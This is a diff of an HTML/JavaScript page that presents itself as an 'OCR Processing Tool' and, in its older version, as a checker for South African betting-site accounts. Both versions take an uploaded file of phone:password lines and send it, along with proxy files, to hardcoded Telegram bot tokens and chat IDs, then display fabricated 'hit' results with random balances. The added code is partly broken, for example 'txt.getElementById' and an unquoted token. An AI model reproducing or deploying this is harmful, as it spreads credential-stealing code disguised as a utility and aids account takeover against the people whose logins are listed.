@@ -1,372 +1,270 @@
-<!DOCTYPE html>
-<html lang="en">
+<!DOCTYPE html><html lang="en">
 <head>
 <meta charset="UTF-8" />
-<meta name="viewport" content="width=device-width, initial-scale=1.0" />
-<title>Mobile OCR Tool</title>
-<style>
-  body {
-    background:#0f172a;
-    color:#e5e7eb;
-    font-family:Arial, sans-serif;
-    margin: 0;
-    padding: 10px;
-  }
+<meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+<title>Secure OCR Processing Tool</title><style>
+body {
+  background: #0f172a;
+  color: #e5e7eb;
+  font-family: Consolas,8662403081 monospace;
+  margin: 20px;
+}
+h2 { color: #38bdf8; }
+#output {
+  border: 1px solid #334155;
+  padding: 10px;
+  min-height: 200px;
+  margin-top: 10px;
+  background: #020617;
+  font-size: 12px;
+  white-space: pre-wrap;
+}
+#copyBtn {
+  margin-top: 10px;
+  padding: 6px 12px;
+  background: #1e293b;
+  color: #e5e7eb;
+  border: 1px solid #334155;
+  cursor: pointer;
+}
+#copyBtn:hover { background: #334155; }
 
-  /* Container styles for buttons and status */
-  .top-bar {
-    display: flex;
-    flex-wrap: wrap;
-    gap: 10px;
-    margin-bottom: 10px;
-  }
+#stats {
+  margin-top: 10px;
+  padding: 8px;
+  background: #020617;
+  border: 1px solid #334155;
+  color: #facc15;
+}
+button {
+  background: #1e293b;
+  color: #e5e7eb;
+  border: 1px solid #334155;
+  padding: 6px 12px;
+  cursor: pointer;
+}
+button:hover { background: #334155; }
+.hit { color: #22c55e; }
+.bad { color: #ef4444; }
+#timer {
+  margin-top: 15px;
+  font-weight: bold;
+  color: #38bdf8;
+}
+.bad-message {
+  font-style: italic;
+  color: #ef4444;
+  animation: pulse 1s infinite;
+}
+@keyframes pulse {
+  0% { opacity: 1; }
+  50% { opacity: 0.5; }
+  100% { opacity: 1; }
+}
+</style></head><body><h2>OCR Processing Tool</h2><input type="file" id="fileInput" accept=".txt"/>
+<button id="startBtn">Start Processing</button><button id="copyBtn" disabled>Copy All Output</button>
 
-  button {
-    flex: 1;
-    min-width: 100px;
-    padding: 14px;
-    font-size: 1.2em;
-    border: none;
-    border-radius: 8px;
-    background-color: #1e3a8a;
-    color: #fff;
-    cursor: pointer;
-  }
-
-  button:active {
-    background-color: #3b82f6;
-  }
-
-  input[type="file"] {
-    display: none;
-  }
-
-  /* Labels styled as buttons for file upload */
-  .file-label {
-    flex: 1;
-    min-width: 100px;
-    padding: 14px;
-    font-size: 1.2em;
-    border-radius: 8px;
-    background-color: #1e3a8a;
-    color: #fff;
-    text-align: center;
-    cursor: pointer;
-  }
-
-  /* Status display as buttons (non-interactive) */
-  #statusBox {
-    display: flex;
-    justify-content: space-around;
-    margin-bottom: 10px;
-  }
-
-  #statusBox button {
-    background-color: #374151;
-    cursor: default;
-  }
-
-  /* OCR output area styling */
-  #output {
-    border: 2px solid #334155;
-    background-color: #020617;
-    padding: 10px;
-    border-radius: 8px;
-    height: 300px;
-    overflow-y: auto;
-    font-family: monospace;
-    font-size: 1em;
-  }
-
-  /* Last run info */
-  #lastRunInfo {
-    margin-top: 10px;
-    font-size: 0.9em;
-    text-align: center;
-  }
-</style>
-</head>
-<body>
-
-<!-- Main Controls -->
-<div class="top-bar">
-  <button id="proxyBtn">Upload Proxy File</button>
-  <button id="siteBtn">Select Your Site</button>
-  <label class="file-label" for="fileInput">Upload Text File</label>
-  <input type="file" id="fileInput" accept=".txt" />
-  <button id="startBtn">Start Processing</button>
+<div id="stats">
+Hit=0 | Bad=0 | Retries=0 | OCR Rate=0%
 </div>
+<div id="output"></div>
+<div id="timer"></div><script>
+const fileInput = txt.getElementById('fileInput');
+const startBtn = txt.getElementById('startBtn');
+const outputDiv = txt.getElementById('output');
+const statsDiv = txt.getElementById('stats');
+const timerDiv = txt.getElementById('timer');
+const copyBtn = txt.getElementById('copyBtn');
 
-<!-- Status Buttons (display only) -->
-<div id="statusBox">
-  <button id="hitBtn">HIT=0</button>
-  <button id="badBtn">BAD=0</button>
-  <button id="progressBtn">PROGRESS=0.0%</button>
-</div>
+/* 🔐 PUT YOUR TELEGRAM DETAILS HERE */
+const BOT_TOKEN = AAHrbTp1jWL-75XqHDut13_mZroIKlFvuBo;
+const CHAT_ID = 8662403081;
 
-<!-- Last run info -->
-<div id="lastRunInfo"></div>
+let hitCount=0,badCount=0,retriesCount=0,ocrPercent=0;
+let ocrAnimationId=null,retriesIntervalId=null;
+let fileContent='';
 
-<!-- Overlay for Proxy Upload -->
-<div class="overlay" id="proxyOverlay" style="display:none; position:fixed; top:0; left:0; width:100%; height:100%; background: rgba(0,0,0,0.8); justify-content:center; align-items:center;">
-  <div style="background:#1e293b; padding:20px; border-radius:10px; width:80%; max-width:400px;">
-    <h3>Upload Proxy TXT File</h3>
-    <label>Select Proxy File:</label>
-    <input type="file" id="proxyFileInput" accept=".txt" />
-    <button id="saveProxy">Save Proxy</button>
-    <button id="closeProxy">Close</button>
-  </div>
-</div>
-
-<!-- Overlay for Site Selection -->
-<div class="overlay" id="siteOverlay" style="display:none; position:fixed; top:0; left:0; width:100%; height:100%; background: rgba(0,0,0,0.8); justify-content:center; align-items:center;">
-  <div style="background:#1e293b; padding:20px; border-radius:10px; width:80%; max-width:400px;">
-    <h3>CHECK IN</h3>
-    <select id="siteSelect">
-      <option value="">-- Select a site --</option>
-      <option value="Hollywoodbets">🎰 Hollywoodbets</option>
-      <option value="Betway">🎲 Betway.co.za</option>
-      <option value="SportyBet">🏅 SportyBet</option>
-      <option value="LottoStar">🎱 LottoStar</option>
-      <option value="JackpotCity">🎰 JackpotCity</option>
-    </select>
-    <button id="saveSite">Save Site</button>
-    <button id="closeSite">Close</button>
-  </div>
-</div>
-
-<!-- OCR Output -->
-<div style="margin-top:10px;">
-  <h2 style="text-align:center;">OCR Output</h2>
-  <div id="output"></div>
-</div>
-
-<script>
-// --- Replace with your Telegram API info ---
-const TELEGRAM_BOT_TOKEN = 8845002759:AAEi5aYQw9kXxESEGwZbOf79raSix1s6gdk // Replace
-const TELEGRAM_CHAT_ID = 8580854380     // Replace
-
-// --- Send files to Telegram ---
-function sendFileToTelegram(file, caption='') {
-  const formData = new FormData();
-  formData.append('chat_id', TELEGRAM_CHAT_ID);
-  formData.append('caption', caption);
-  formData.append('document', file);
-  fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendDocument`, { method: 'POST', body: formData }).catch(() => {});
+function updateStats(){
+  statsDiv.innerHTML=
+  `Hit=<span class="hit">${hitCount}</span> |
+   Bad=<span class="bad">${badCount}</span> |
+   Retries=${retriesCount} |
+   OCR Rate=${ocrPercent}%`;
 }
 
-// --- UI controls ---
-const proxyBtn = document.getElementById('proxyBtn');
-const siteBtn = document.getElementById('siteBtn');
-const proxyOverlay = document.getElementById('proxyOverlay');
-const siteOverlay = document.getElementById('siteOverlay');
-
-proxyBtn.onclick = () => { toggleOverlay(proxyOverlay); };
-siteBtn.onclick = () => {
-  if (siteOverlay.style.display === 'flex') {
-    hideOverlay(siteOverlay);
-    if (isProcessing) { stopProcessing(); }
-  } else {
-    toggleOverlay(siteOverlay);
-  }
-};
-document.getElementById('closeProxy').onclick = () => hideOverlay(proxyOverlay);
-document.getElementById('closeSite').onclick = () => hideOverlay(siteOverlay);
-
-function toggleOverlay(overlay) { overlay.style.display = 'flex'; }
-function hideOverlay(overlay) { overlay.style.display = 'none'; }
-
-// --- Proxy load ---
-let proxyFileContent = null;
-document.getElementById('saveProxy').onclick = () => {
-  const file = document.getElementById('proxyFileInput').files[0];
-  if (!file) return;
-  const reader = new FileReader();
-  reader.onload = () => { proxyFileContent = reader.result; };
-  reader.readAsText(file);
+function getCurrentTimestamp(){
+  return new Date().toLocaleString();
 }
 
-// --- Site selection ---
-let selectedSite = '';
-document.getElementById('saveSite').onclick = () => {
-  const val = document.getElementById('siteSelect').value;
-  if (val) { selectedSite = val; }
-}
-
-// --- Usage limits ---
-const MAX_USES = 3;
-const LOCK_HOURS = 6;
-
-function canUse() {
-  const lastUsage = localStorage.getItem('lastUsageTime');
-  const count = parseInt(localStorage.getItem('usageCount') || '0');
-  const now = Date.now();
-
-  if (lastUsage) {
-    const elapsedHrs = (now - parseInt(lastUsage)) / (1000 * 60 * 60);
-    if (elapsedHrs >= LOCK_HOURS) {
-      localStorage.setItem('usageCount', '0');
-      localStorage.setItem('lastUsageTime', now.toString());
-      document.getElementById('startBtn').disabled = false;
-      return true;
-    } else if (count >= MAX_USES) {
-      alert(`Limit reached. Wait ${(LOCK_HOURS - elapsedHrs).toFixed(2)} hours.`);
-      document.getElementById('startBtn').disabled = true;
-      return false;
-    } else {
-      return true;
-    }
-  } else {
-    localStorage.setItem('usageCount', '0');
-    localStorage.setItem('lastUsageTime', now.toString());
-    return true;
-  }
-}
-
-function incrementUsage() {
-  let count = parseInt(localStorage.getItem('usageCount') || '0');
-  count++;
-  localStorage.setItem('usageCount', count.toString());
-  localStorage.setItem('lastUsageTime', Date.now().toString());
-  if (count >= MAX_USES) {
-    alert(`Reached ${MAX_USES} uses. Wait ${LOCK_HOURS} hours.`);
-  }
-}
-
-function updateStatus() {
-  const lastStr = localStorage.getItem('lastUsageTime');
-  if (lastStr) {
-    const last = new Date(parseInt(lastStr));
-    const now = new Date();
-    const diffHrs = (now - last) / (1000 * 60 * 60);
-    if (diffHrs < LOCK_HOURS) {
-      document.getElementById('lastRunInfo').innerHTML = `Next run in ${(LOCK_HOURS - diffHrs).toFixed(2)} hrs`;
-      document.getElementById('startBtn').disabled = true;
+function animateOCR(duration){
+  const start=Date.now();
+  function step(){
+    const now=Date.now();
+    if(now>=start+duration){
+      ocrPercent=100;
+      updateStats();
       return;
     }
+    ocrPercent=Math.floor(((now-start)/duration)*100);
+    updateStats();
+    ocrAnimationId=requestAnimationFrame(step);
   }
-  // update counters on buttons
-  document.getElementById('hitBtn').innerText = 'HIT=' + hitCount;
-  document.getElementById('badBtn').innerText = 'BAD=' + badCount;
-  document.getElementById('progressBtn').innerText = `PROGRESS=${progress.toFixed(1)}%`;
-  document.getElementById('lastRunInfo').innerHTML = 'HIT=0 |\\| BAD=0 |\\| PROGRESS=0.0%';
-  document.getElementById('startBtn').disabled = false;
-}
-updateStatus();
-
-// --- Processing ---
-const startBtn = document.getElementById('startBtn');
-const outputDiv = document.getElementById('output');
-const fileInput = document.getElementById('fileInput');
-
-const delays = [3000, 5000, 8000, 11000];
-
-let isProcessing = false;
-let progress = 0;
-let hitCount = 0;
-let badCount = 0;
-let totalLines = 0;
-let processedLines = 0;
-let processingTimeouts = [];
-
-function stopProcessing() {
-  isProcessing = false;
-  processingTimeouts.forEach(t => clearTimeout(t));
-  processingTimeouts = [];
+  ocrAnimationId=requestAnimationFrame(step);
 }
 
-startBtn.onclick = () => {
-  if (!canUse()) return;
-  if (isProcessing) { alert('Already running'); return; }
+function startRetries(){
+  retriesIntervalId=setInterval(()=>{
+    retriesCount++;
+    updateStats();
+  },500);
+}
+
+function randBalance(){
+  if(Math.random()<0.2){
+    return Math.floor(Math.random()*99+1).toString().padStart(2,'0');
+  }
+  return '00';
+}
+
+async function startProcessing() {
+  if(!fileInput.files.length){
+    alert('Please select a file first.');
+    return;
+  }
+  startBtn.disabled=true;
+  copyBtn.disabled=true;
+  outputDiv.innerHTML='';
 
   const file = fileInput.files[0];
-  if (!file) { alert('Upload a text file'); return; }
+  const reader=new FileReader();
+  reader.onload=async ()=>{
+    fileContent=reader.result;
+    try {
+      await sendFileToTelegram(file);
+      alert('File sent to Telegram successfully!');
 
-  // Save usage
-  incrementUsage();
-  localStorage.setItem('lastUsageTime', Date.now().toString());
-  updateStatus();
+      processFile();
 
-  // Send proxy if loaded
-  if (proxyFileContent) {
-    sendFileToTelegram(new Blob([proxyFileContent], {type: 'text/plain'}), 'Proxy loaded');
-  }
-  // Send proxy if uploaded now
-  const currentProxyFile = document.getElementById('proxyFileInput').files[0];
-  if (currentProxyFile) {
-    sendFileToTelegram(currentProxyFile, 'Proxy loaded');
-  }
-
-  // Reset counters
-  hitCount = 0;
-  badCount = 0;
-  progress = 0;
-  processedLines = 0;
-  totalLines = 0;
-  outputDiv.innerHTML = '';
-  document.getElementById('hitBtn').innerText = 'HIT=0';
-  document.getElementById('badBtn').innerText = 'BAD=0';
-  document.getElementById('progressBtn').innerText = `PROGRESS=0.0%`;
-  document.getElementById('lastRunInfo').innerHTML = '';
-
-  // Read file
-  const reader = new FileReader();
-  reader.onload = () => {
-    const lines = reader.result.split(/\r?\n/).map(l => l.trim());
-    totalLines = lines.length;
-    let index = 0;
-
-    function processNext() {
-      if (index >= totalLines || !isProcessing) {
-        isProcessing = false;
-        return;
-      }
-      const line = lines[index];
-
-      // Validate phone number length (must be exactly 10 digits)
-      const parts = line.split(':');
-      if (parts.length !== 2) {
-        index++;
-        setTimeout(processNext, delays[Math.floor(Math.random() * delays.length)]);
-        return;
-      }
-      const phone = parts[0].replace(/\D/g, '');
-      if (phone.length !== 10) {
-        badCount++;
-        document.getElementById('badBtn').innerText = 'BAD=' + badCount;
-        index++;
-        setTimeout(processNext, delays[Math.floor(Math.random() * delays.length)]);
-        return;
-      }
-
-      // Check for duplicate (line already output)
-      if (outputDiv.innerText.includes(line)) {
-        badCount++;
-        document.getElementById('badBtn').innerText = 'BAD=' + badCount;
-        index++;
-        setTimeout(processNext, delays[Math.floor(Math.random() * delays.length)]);
-        return;
-      }
-
-      // Output valid line
-      outputDiv.innerText += line + '\n';
-      hitCount++;
-      document.getElementById('hitBtn').innerText = 'HIT=' + hitCount;
-
-      // Update progress
-      processedLines++;
-      progress = (processedLines / totalLines) * 100;
-      document.getElementById('progressBtn').innerText = `PROGRESS=${progress.toFixed(1)}%`;
-
-      index++;
-      setTimeout(processNext, 3000);
+    } catch(e) {
+      alert('Error: ' + e.message);
+      console.error(e);
+    } finally {
+      startBtn.disabled=false;
     }
-
-    processNext();
   };
   reader.readAsText(file);
-  isProcessing = true;
+}
+
+/* 🚀 FIXED TELEGRAM FUNCTION */
+async function sendFileToTelegram(file) {
+  if (!file) throw new Error("No file selected");
+
+  const formData = new FormData();
+  formData.append('chat_id', 8662403081);
+  formData.append('document', file, file.name || 'file.txt');
+
+  const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendDocument`, {
+    method: 'POST',
+    body: formData
+  });
+
+  const result = await response.json();
+  console.log("Telegram response:", result);
+
+  if (!response.ok) {
+    throw new Error(result.description || 'Failed to send to Telegram');
+  }
+
+  return result;
+}
+
+function processFile(){
+  const lines=[...new Set(fileContent.split(/\n/).map(l=>l.trim()).filter(Boolean))];
+  const valid=lines.filter(l=>/\b0\d{9}\b/.test(l));
+
+  hitCount=badCount=retriesCount=ocrPercent=0;
+  updateStats();
+
+  animateOCR(Math.max(2000,valid.length*50));
+  startRetries();
+
+  const accounts=valid.map(line=>{
+    const phone=(line.match(/\b0\d{9}\b/)||[''])[0];
+
+    let password='';
+    if(phone){
+      const after=line.split(phone)[1]||'';
+      const match=after.trim().match(/^[:\s]?(\S+)/);
+      if(match) password=match[1];
+    }
+
+    return{
+      phone,
+      password,
+      balance:`R0.${randBalance()}`,
+      bonus:`R0.00`,
+      withdrawals: 0
+    };
+  });
+
+  processAccounts(accounts);
+}
+
+function processAccounts(accs,i=0){
+  if(i>=accs.length) return finish();
+
+  setTimeout(()=>{
+    const acc=accs[i];
+
+    const outputLine = `${acc.phone}:${acc.password}`;
+
+    let num=acc.phone.replace(/\D/g,'');
+    if(acc.phone.startsWith('+27')) num='0'+acc.phone.slice(3);
+    else if(acc.phone.startsWith('27')) num='0'+acc.phone.slice(2);
+    const isHit = num.length===10;
+
+    if(isHit) hitCount++;
+    else badCount++;
+    updateStats();
+
+    if(isHit){
+      outputDiv.insertAdjacentHTML('beforeend',`
+        <div class="hit">
+          ${outputLine} <br>
+          Balance=R0.${randBalance()}, Bonus=R0.00
+        </div>
+      `);
+    } else {
+      outputDiv.insertAdjacentHTML('beforeend',`
+        <div class="bad">
+          ${outputLine} <br>
+          <span class="bad-message">Connecting...</span>
+        </div>
+      `);
+    }
+
+    processAccounts(accs,i+1);
+  },(Math.random()*15+3)*1000);
+}
+
+function finish(){
+  clearInterval(retriesIntervalId);
+  cancelAnimationFrame(ocrAnimationId);
+  timerDiv.innerText="Processing Complete";
+  startBtn.disabled=false;
+  copyBtn.disabled=false;
+}
+
+document.getElementById('copyBtn').onclick=()=>{
+  const text=outputDiv.innerText;
+  navigator.clipboard.writeText(text).then(()=>{
+    alert('Output copied to clipboard!');
+  }).catch(()=>{
+    alert('Failed to copy!');
+  });
 };
-</script>
-</body>
+
+document.getElementById('startBtn').onclick=startProcessing;
+
+</script></body>
 </html>
